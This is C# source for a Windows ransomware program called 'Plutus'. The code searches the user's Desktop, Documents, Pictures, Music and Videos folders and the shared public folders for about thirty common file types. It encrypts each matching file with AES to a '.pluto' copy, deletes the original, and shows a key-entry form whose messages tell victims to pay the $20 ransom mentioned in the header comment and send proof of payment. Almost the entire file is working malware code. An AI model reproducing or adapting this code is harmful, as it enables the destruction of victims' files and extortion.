using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Threading;
using System.Runtime;

//
//  This ransomware will ecnrypt a large
//  amount of files, these files are
//  included in a array below named
//  fileExtension. If we where you we'd
//  pay the ransome its only $20
//

namespace Plutus
{
    public partial class pluto : Form
    {

        List<string> filesToLock = new List<string>();

        public pluto()
        {

            //executing file grabbing in constructor

            string[] fileExtension = new string[] {"*.docx", "*.pptx", "*.txt",
                                               "*.jpeg", "*.jpg", "*.png",
                                               "*.pdf", "*.mp3", "*.gif",
                                               "*.ppt", "*.zip", "*.bat",
                                               "*.py", "*.vb", "*.vbs",
                                               "*.bmp", "*.ps2", "*.jbig",
                                               "*.mp4", "*.mkv", "*.php",
                                               "*.avi", "*.rar", "*.wav",
                                               "*.xls", "*.xlsx", "*.htm", 
                                               "*.html", "*.json", "*.html",
                                               "*.md", "*.cpp", "*.h",
                                               "*.pluto"};

            //Areas that'll be locked
            List<string> dirsToLock = new List<string>();
            
            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
            
            string[] dirsToLockArr = dirsToLock.ToArray();

            for (int dirIndex = 0; dirIndex < dirsToLockArr.Length; dirIndex++)
            {
                foreach (string ext in fileExtension)
                {
                    try
                    {
                        string[] temp = Directory.GetFiles(dirsToLockArr[dirIndex], ext, SearchOption.AllDirectories);

                    for (int index = 0; index < temp.Length; index++)
                        {
                            if (temp[index] == null)
                            {
                                //prevent form encrpyting/decrypting missing values
                                continue;
                            }
                            else if ((temp[index].Contains(".pluto")))
                            {
                                //prevent double encryption 
                                filesToLock.Add(temp[index]);
                                continue;
                            }
                            filesToLock.Add(temp[index]);
                            lockFiles(temp[index], "b4bf229e792f4ff18b1baccb7785ca743b9af297101f64be005e1cc19ed0b206");
                        }
                    }
                    catch (Exception)
                    {
                        //to catch errors when grabbing files
                        continue;
                    }

                }
            }

            filesToLock.ToArray();

            InitializeComponent();
            
        }

        private void button1_Click(object sender, EventArgs e)
        {

            if(keyBox.Text == "b4bf229e792f4ff18b1baccb7785ca743b9af297101f64be005e1cc19ed0b206")
            {
                MessageBox.Show("Key accepted, decrpytion will start now. \nJust sit tight, and relax");
                foreach (string unlockingFiles in filesToLock)
                {
                    if (unlockingFiles.Contains(".pluto"))
                    {
                        this.unlockFile(unlockingFiles, "b4bf229e792f4ff18b1baccb7785ca743b9af297101f64be005e1cc19ed0b206");
                    }
                }
                    MessageBox.Show("Decrypted enjoy your files \n" +
                                "                  \\(¬_¬)/ \n" +
                                "                      |_| \n" +
                                "                      / \\ " );
            }
            else
            {
                MessageBox.Show("That key was wrong, what to do? \n " +
                    "      - Make sure you've paid \n" +
                    "      - Make sure you've copied the key properly \n" +
                    "      - Contact us asking for help key \n" +
                    "      - Send us proof that you've paid and will send \n" +
                    "        functioning key or decryprion software");
            }
        }

        //File encryption goes here :)
        //Everything below goes for file locking/unlocking

        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        public static extern bool ZeroMemory(IntPtr Destitnation, int length);


        //generating our salt keys here
        public static byte[] createSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for(int index = 0; index<10; index++)
                {
                    rng.GetBytes(data);
                }
            }

            return data;

        }


        //locking files here
        private void lockFiles(string inputFiles, string password)
        {
            byte[] salt = createSalt();

            FileStream fs = new FileStream(inputFiles+".pluto", FileMode.Append);

            byte[] passBytes = System.Text.Encoding.UTF8.GetBytes(password);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            var key = new Rfc2898DeriveBytes(passBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            AES.Mode = CipherMode.CFB;

            fs.Write(salt, 0, salt.Length);
            CryptoStream cs = new CryptoStream(fs, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFiles, FileMode.Open);

            byte[] buffer = new byte[91048576];
            int read;

            try
            {
                while((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    Application.DoEvents();
                    cs.Write(buffer, 0, read);
                }

                fsIn.Close();

            }
            catch(Exception e)
            {

            }
            finally
            {
                File.Delete(inputFiles);
                cs.Close();
                fs.Close();
            }
        }


        //unlocking files here
        private void unlockFile(string inputFiles, string password)
        {
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[32];

            FileStream fsCrypt = new FileStream(inputFiles, FileMode.Open);
            fsCrypt.Read(salt, 0, salt.Length);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.PKCS7;
            AES.Mode = CipherMode.CFB;

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);
            string outputFile = inputFiles.Replace(".pluto", "");

            FileStream fsOut = new FileStream(outputFile, FileMode.Create);

            int read;
            byte[] buffer = new byte[1048576];

            try
            {
                while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
                {
                    Application.DoEvents();
                    fsOut.Write(buffer, 0, read);
                }
            }
            catch (CryptographicException ex_CryptographicException)
            {
                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            try
            {
                cs.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
            }
            finally
            {
                File.Delete(inputFiles);
                fsOut.Close();
                fsCrypt.Close();
            }
        }

    }
}